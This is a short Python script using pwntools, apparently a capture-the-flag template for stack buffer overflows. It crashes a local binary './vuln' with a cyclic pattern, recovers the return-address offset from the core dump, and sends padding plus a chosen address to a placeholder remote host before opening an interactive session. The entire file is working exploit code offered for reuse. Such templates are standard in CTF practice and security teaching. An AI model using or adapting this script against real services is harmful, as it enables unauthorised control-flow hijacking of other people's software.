from pwn import *

# modify the variables below here
host = "insert.host.here"
port = 1234
address = 0xdeadbeef
littleEndian = True
binaryName = "./vuln"
# modify the variables above here

elf = ELF(binaryName)
p = process(binaryName)
p.sendline(cyclic(200, n=8))
p.wait()

core = p.corefile
offset = cyclic_find(core.read(core.rsp, 8), n=8)

print(f"The offset is {offset}")

conn = remote(host, port)
if littleEndian == True:
    conn.sendline(b"A"*offset+p64(address))
else:
    context.endian = 'big'
    conn.sendline(b"A"*offset+p64(address))

conn.interactive()
